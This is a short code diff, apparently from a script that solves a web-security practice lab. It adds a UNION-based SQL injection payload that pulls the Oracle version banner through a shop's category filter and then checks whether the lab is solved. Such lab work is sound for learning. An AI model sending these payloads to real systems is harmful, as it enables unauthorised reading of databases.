@@ -30,8 +30,12 @@ def main(args):
     text_columns = utils.determine_text_columns(
         shop.category_url, shop.no_proxy, num_columns, oracle=True
     )
-    print(num_columns, text_columns)
-    
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "banner"
+    nulls_str = ",".join(nulls)
+    exploit = f"' UNION SELECT {nulls_str} FROM v$version--"
+    shop.get_category(exploit)
+    shop.is_solved()
     
     
 if __name__ == "__main__":
